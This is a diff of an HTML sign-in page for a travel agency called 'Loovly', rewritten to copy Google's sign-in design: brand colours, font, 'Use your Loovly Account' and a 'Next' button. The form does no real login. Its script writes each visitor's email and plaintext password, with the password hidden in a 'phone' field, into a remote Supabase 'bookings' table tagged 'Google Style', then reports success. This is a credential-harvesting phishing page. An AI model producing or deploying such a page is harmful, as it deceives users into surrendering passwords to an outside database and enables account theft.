@@ -1,47 +1,53 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loovly Travel - تسجيل الدخول</title>
+<title>Loovly - Sign in</title>
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <style>
-  body{font-family:'Segoe UI', sans-serif; background: linear-gradient(135deg,#00b4d8,#0077b6); height:100vh; display:flex; align-items:center; justify-content:center; margin:0;}
-  .card{background:#fff; padding:35px; border-radius:20px; width:100%; max-width:380px; box-shadow:0 15px 35px rgba(0,0,0,.2); text-align:center;}
-  .logo{font-size:32px; font-weight:800; color:#0077b6; margin-bottom:5px;} .logo span{color:#00b4d8;}
-  .sub{color:#666; margin-bottom:25px; font-size:14px;}
-  .input-group{text-align:right; margin-bottom:15px;}
-  .input-group label{font-size:13px; color:#333; font-weight:600;}
-  .input-group input{width:100%; padding:13px; border:1.5px solid #e0e0e0; border-radius:10px; margin-top:6px; box-sizing:border-box; outline:none;}
-  .input-group input:focus{border-color:#0077b6;}
-  button{width:100%; padding:13px; background:#0077b6; color:#fff; border:none; border-radius:10px; font-size:16px; font-weight:700; cursor:pointer; margin-top:10px;}
+  body{font-family: 'Google Sans', Roboto, Arial, sans-serif; background:#fff; margin:0; display:flex; align-items:center; justify-content:center; min-height:100vh;}
+  .card{width:100%; max-width:410px; padding:48px 40px 36px; border:1px solid #dadce0; border-radius:8px; text-align:left;}
+  .logo{font-size:28px; font-weight:500; letter-spacing:-1px; margin-bottom:10px;}
+  .logo .b{color:#4285F4} .logo .r{color:#DB4437} .logo .y{color:#F4B400} .logo .g{color:#0F9D58}
+  h1{font-size:24px; font-weight:400; color:#202124; margin:10px 0 10px;}
+  .sub{font-size:16px; color:#202124; margin-bottom:35px;}
+  .input-group{margin-bottom:20px;}
+  .input-group input{width:100%; padding:15px 14px; border:1px solid #dadce0; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none;}
+  .input-group input:focus{border:2px solid #1a73e8; padding:14px 13px;}
+  label{font-size:14px; color:#5f6368; display:block; margin-bottom:8px;}
+  button{width:100%; padding:11px; background:#1a73e8; color:#fff; border:none; border-radius:4px; font-size:14px; font-weight:500; letter-spacing:.25px; cursor:pointer; margin-top:15px;}
+  button:hover{background:#1765cc;}
   button:disabled{opacity:.6;}
-  #msg{margin-top:15px; font-size:14px;}
+  #msg{margin-top:20px; font-size:14px; text-align:center;}
+  .footer{font-size:12px; color:#5f6368; text-align:center; margin-top:30px;}
 </style>
 </head>
 <body>
 
 <div class="card">
-  <div class="logo">L<span>oo</span>vly</div>
-  <div class="sub">وكالة سفر وسياحة - مرحبا بعودتك</div>
+  <div class="logo">
+    <span class="b">L</span><span class="r">o</span><span class="y">o</span><span class="b">v</span><span class="g">l</span><span class="r">y</span>
+  </div>
+  <h1>Sign in</h1>
+  <div class="sub">Use your Loovly Account</div>
 
   <form id="loovlyForm" onsubmit="handleLoovlyLogin(event)">
     <div class="input-group">
-      <label>البريد الالكتروني</label>
-      <input type="email" id="email" placeholder="example@loovly.com" required>
+      <label>Email</label>
+      <input type="email" id="email" placeholder="Email" required>
     </div>
     <div class="input-group">
-      <label>كلمة المرور</label>
-      <input type="password" id="password" placeholder="••••••••" required>
+      <label>Password</label>
+      <input type="password" id="password" placeholder="Enter your password" required>
     </div>
-    <button type="submit" id="btn">تسجيل الدخول</button>
+    <button type="submit" id="btn">Next</button>
     <p id="msg"></p>
   </form>
-  <p style="font-size:12px; color:#888; margin-top:20px;">© 2026 Loovly Travel Agency</p>
+  <div class="footer">© 2026 Loovly Travel Agency</div>
 </div>
 
 <script>
-// ربط سيرفر Loovly
 const supabaseClient = window.supabase.createClient(
   'https://nwpyevsjnublptabupup.supabase.co',
   'sb_publishable_v18mMHdeW7e-0pegmi9sTg_U3HkIlJK'
@@ -55,26 +61,24 @@ async function handleLoovlyLogin(e){
   const msg = document.getElementById('msg');
 
   btn.disabled = true;
-  btn.innerText = 'جاري تسجيل الدخول...';
-  
+  btn.innerText = 'Loading...';
+
   const { error } = await supabaseClient.from('bookings').insert([{
-    name: 'Loovly - تسجيل دخول',
+    name: 'Loovly Login',
     email: email,
     phone: password,
-    destination: 'Loovly Agency Login'
+    destination: 'Loovly Google Style'
   }]);
 
   if(error){
-    msg.innerText = '❌ خطأ: ' + error.message;
-    msg.style.color = 'red';
+    msg.innerText = 'Error: ' + error.message;
+    msg.style.color = '#d93025';
   } else {
-    msg.innerText = '✅ اهلا بك في Loovly! تم تسجيل دخولك';
-    msg.style.color = 'green';
-    // هنا تقدر تحوله لصفحة الحجوزات
-    // window.location.href = 'dashboard.html';
+    msg.innerText = 'Welcome to Loovly!';
+    msg.style.color = '#1e8e3e';
   }
   btn.disabled = false;
-  btn.innerText = 'تسجيل الدخول';
+  btn.innerText = 'Next';
 }
 </script>
 </body>
